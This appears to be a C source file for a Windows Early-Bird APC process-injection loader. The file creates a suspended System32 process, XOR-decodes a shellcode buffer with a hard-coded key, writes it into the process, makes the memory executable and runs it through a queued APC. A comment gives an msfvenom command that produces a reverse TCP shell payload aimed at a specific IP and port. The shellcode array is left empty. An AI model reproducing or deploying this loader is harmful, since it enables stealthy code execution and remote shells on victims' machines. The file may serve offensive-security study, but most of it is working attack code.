#include "header.h"

#define KEY "FHTW"

// Suspended process creation for Early-Bird APC Injection
BOOL CreateSuspendedProcess(IN LPCSTR lpProcessName, OUT PDWORD pdwPid, OUT PHANDLE phProcess, OUT PHANDLE phThread) {

	BOOL bState = TRUE; 
	CHAR lpPath[MAX_PATH * 2];
	CHAR WnDr[MAX_PATH];

	STARTUPINFO            Si = { 0 };
	PROCESS_INFORMATION    Pi = { 0 };

	// Cleaning the structs by setting the element values to 0
	RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));

	// Setting the size of the structure
	Si.cb = sizeof(STARTUPINFO);

	// Getting the %WINDIR% environment variable path (That is generally 'C:\Windows')
	if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
		PRINT_ERROR("GetEnvironmentVariableA");
		bState = FALSE;
		goto CLEANUP;
	}

	// Creating the target process path 
	sprintf_s(lpPath, MAX_PATH * 2, "%s\\System32\\%s", WnDr, lpProcessName);
	OKAY("Starting process: %s.", lpPath);

	// Creating the process
	if (!CreateProcessA(
		NULL,
		lpPath,
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED,		// Create process in a suspended state	
		NULL,
		NULL,
		&Si,
		&Pi))
	{
		PRINT_ERROR("CreateProcessA");
		bState = FALSE;
		goto CLEANUP;
	}

	// Store values
	*pdwPid = Pi.dwProcessId;
	*phProcess = Pi.hProcess;
	*phThread = Pi.hThread;

CLEANUP:
	if (*pdwPid == NULL || *phProcess == NULL || *phThread == NULL) {
		bState = FALSE;
	}

	return bState;
}

// Process Injection 
BOOL Inject(IN HANDLE hProcess, IN HANDLE hThread, IN PBYTE pShellcode, IN SIZE_T sSize) {

	BOOL bState = TRUE;
	PVOID pAddress = NULL; 
	SIZE_T sBytesWritten = NULL; 
	DWORD dwOldProtection = NULL; 

	// Allocate memory
	pAddress = VirtualAllocEx(hProcess, NULL, sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); 
	if (!pAddress) {
		PRINT_ERROR("VirtualAllocEx"); 
		bState = FALSE;
		goto CLEANUP; 
	}
	OKAY("[ 0x%p ] [RW-] Memory allocated.", pAddress); 

	// Decrypt payload 
	SIZE_T sKeyLength = strlen(KEY);
	for (int i = 0; i < sSize; i++) {
		pShellcode[i] ^= KEY[i % sKeyLength];
	}
	OKAY("[ 0x%p ] Decoded payload with key \"%s\".", pShellcode, KEY);

	// Write payload to allocated memory
	if (!WriteProcessMemory(hProcess, pAddress, pShellcode, sSize, &sBytesWritten)) {
		PRINT_ERROR("WriteProcessMemory");
		bState = FALSE;
		goto CLEANUP; 
	}
	OKAY("[ 0x%p ] %d bytes written.", pAddress, sBytesWritten); 

	// Change memory protection
	if (!VirtualProtectEx(hProcess, pAddress, sSize, PAGE_EXECUTE, &dwOldProtection)) {
		PRINT_ERROR("VirtualProtectEx"); 
		bState = FALSE;
		goto CLEANUP; 
	}
	OKAY("[ 0x%p ] [--X] Memory protection changed.", pAddress); 

	// Queue asynchronous procedure call
	if (!QueueUserAPC((PAPCFUNC)pAddress, hThread, NULL)) {
		PRINT_ERROR("QueueUserAPC");
		bState = FALSE;
		goto CLEANUP; 
	}
	OKAY("[ 0x%p ] APC queued.", pAddress); 

	// Resume execution
	ResumeThread(hThread); 
	OKAY("[ 0x%p ] Thread resumed.", hThread);

CLEANUP:

	return bState;
}

int main(int argc, char* argv[]) {

	DWORD dwPid = NULL;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL; 

	// msfvenom - p windows/x64/shell_reverse_tcp LHOST=192.168.168.129 LPORT=443 EXITFUNC=thread -a x64 --platform windows -f raw -o rev.bin
	// python3 encoder.py
	unsigned char pShellcode[] = {
		
	};

	// Handle command line arguments
	if (argc < 2) {
		printf("Usage: %s <process name>\n", argv[0]);
		return EXIT_FAILURE;
	}

	// Get handle to remote process
	if (!CreateSuspendedProcess(argv[1], &dwPid, &hProcess, &hThread)) {
		PRINT_ERROR("CreateSuspendedProcess");
		return EXIT_FAILURE; 
	}
	OKAY("[ 0x%p ] [ %d ] Process created with CREATE_SUSPENDED flag.", hProcess, dwPid);

	// Inject 
	if (!Inject(hProcess, hThread, pShellcode, sizeof(pShellcode))) {
		PRINT_ERROR("Inject");
		return EXIT_FAILURE;
	}

	if (hProcess) {
		CloseHandle(hProcess);
	}

	return EXIT_SUCCESS;
}